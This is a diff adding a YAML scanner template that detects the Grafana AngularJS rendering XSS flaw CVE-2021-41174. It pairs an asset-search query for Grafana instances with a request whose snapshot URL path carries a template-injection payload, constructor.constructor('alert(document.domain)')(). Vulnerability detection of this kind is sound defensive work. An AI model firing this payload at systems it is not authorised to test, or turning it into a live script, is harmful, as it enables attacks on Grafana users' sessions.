@@ -1,0 +1,19 @@
+name: Grafana Angularjs Rendering XSS CVE-2021-41174
+manual: true
+query: app="grafana_labs-company products" || product="Grafana_Labs-Company Products"
+  || company="Grafana Labs " || title="grafana"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /dashboard/snapshot/%7B%7Bconstructor.constructor(%27alert(document.domain)%27)()%7D%7D?orgId=1
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"frontend_boot_js_done_time_seconds")
+expression: r0()
+detail:
+  links:
+  - https://nvd.nist.gov/vuln/detail/CVE-2021-41174
+  - https://github.com/grafana/grafana/security/advisories/GHSA-3j9m-hcv9-rpj8
+  description: Grafana is an open-source platform for monitoring and observability.
+  tags: xss
